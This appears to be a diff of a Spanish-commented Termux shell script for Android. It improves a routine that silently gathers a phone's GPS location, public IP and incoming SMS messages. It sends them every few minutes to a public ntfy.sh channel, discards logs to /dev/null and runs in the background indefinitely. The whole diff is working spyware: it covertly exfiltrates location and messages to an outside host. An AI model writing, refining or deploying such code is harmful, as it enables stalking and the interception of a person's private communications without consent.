@@ -3,7 +3,8 @@
 
 # === CONFIGURACIÓN ===
 NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público
-INTERVALO=3600  # Intervalo en segundos (1 hora)
+INTERVALO=3600  # Intervalo principal en segundos (1 hora)
+LOC_INTERVAL=300  # Intervalo para ubicación (5 minutos)
 LOGFILE="/dev/null"
 SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"
 
@@ -12,7 +13,46 @@ enviar_ntfy() {
     curl -s -d "$1" "$NTFY_URL" > $LOGFILE 2>&1
 }
 
-# === FUNCIÓN PRINCIPAL ===
+# === FUNCIÓN PARA OBTENER UBICACIÓN ===
+obtener_ubicacion() {
+    local intentos=0
+    local ubicacion=""
+    
+    # Intentamos primero con GPS, luego con red
+    while [ $intentos -lt 3 ] && [ -z "$ubicacion" ]; do
+        ubicacion=$(termux-location -p gps -r once 2>/dev/null)
+        if [ -z "$ubicacion" ]; then
+            ubicacion=$(termux-location -p network -r once 2>/dev/null)
+        fi
+        intentos=$((intentos+1))
+        sleep 2
+    done
+    
+    echo "$ubicacion"
+}
+
+# === MONITOREO DE UBICACIÓN ===
+monitor_ubicacion() {
+    while true; do
+        ubicacion=$(obtener_ubicacion)
+        if [ -n "$ubicacion" ]; then
+            LAT=$(echo "$ubicacion" | jq -r '.latitude')
+            LON=$(echo "$ubicacion" | jq -r '.longitude')
+            ACC=$(echo "$ubicacion" | jq -r '.accuracy // "unknown"')
+            
+            enviar_ntfy "📍 Ubicación: 
+Latitud: $LAT
+Longitud: $LON
+Precisión: $ACC metros
+🗺️ https://www.google.com/maps?q=$LAT,$LON"
+        else
+            enviar_ntfy "⚠️ No se pudo obtener ubicación"
+        fi
+        sleep $LOC_INTERVAL
+    done
+}
+
+# === FUNCIÓN PRINCIPAL DE RECOPILACIÓN ===
 recopilar_datos() {
     # 1. Info del dispositivo
     IP=$(curl -s ifconfig.me)
@@ -58,19 +98,7 @@ recopilar_datos() {
             sleep 1
         done
     fi
-
-
-while true; do
-    LOC=$(termux-location -p network 2>/dev/null)
-    if [ -n "$LOC" ]; then
-        LAT=$(echo "$LOC" | jq -r '.latitude')
-        LON=$(echo "$LOC" | jq -r '.longitude')
-        curl -s -d "Ubicación actual: $LAT,$LON" "$NTFY_URL"
-    else
-        curl -s -d "No se pudo obtener ubicación" "$NTFY_URL"
-    fi
-    sleep 2  # 5 minutos
-done
+}
 
 # === MONITOREO DE NUEVOS SMS ===
 monitor_sms() {
@@ -86,10 +114,22 @@ monitor_sms() {
                 echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
             fi
         fi
-        sleep 1 # cada 30 segundos
+        sleep 30  # Verificar cada 30 segundos
     done
 }
 
-# === EJECUCIÓN EN SEGUNDO PLANO ===
-recopilar_datos &
+# === EJECUCIÓN PRINCIPAL ===
+# Verificar y solicitar permisos necesarios
+termux-location >/dev/null 2>&1
+termux-sms-list >/dev/null 2>&1
+
+# Iniciar todos los monitores en segundo plano
+recopilar_datos
+monitor_ubicacion &
 monitor_sms &
+
+# Mantener el script activo
+while true; do
+    sleep $INTERVALO
+    recopilar_datos
+done
